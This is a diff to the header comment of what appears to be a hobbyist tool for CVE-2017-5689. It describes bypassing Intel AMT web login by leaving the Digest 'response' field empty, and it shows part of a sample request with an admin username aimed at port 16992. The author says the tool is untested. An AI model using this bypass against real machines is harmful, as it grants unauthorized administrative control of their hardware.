@@ -4,13 +4,15 @@ does this even work?
 This has some new things I have never done before and I am still testing it... haven't even run the darn thing yet but it looks like it works I guess.
 
 ################################################################################
+
 This is a tool to persist an Intel IME admin session by modifying the GET 
 request to have the "response:" field empty in every request. 
 The web portal presented by the HARDWARE uses an MD5 in the response body to
 authenticate and per the link given, can be bypassed by simply emptying it.
-https://www.ssh.com/vulnerability/intel-amt/
 
 CVE-2017-5689
+
+  https://www.ssh.com/vulnerability/intel-amt/
 
   https://nvd.nist.gov/vuln/detail/CVE-2017-5689
  
@@ -24,9 +26,10 @@ CVE-2017-5689
  
 ###############################################################################
 
- Referer: http://192.168.0.44:16992/logon.htm
+ Referer: `http://192.168.0.44:16992/logon.htm`
 
  Authorization: 
+ 
        Digest username="admin", 
        
        realm="Digest:72C40000000000000000000000000000", 
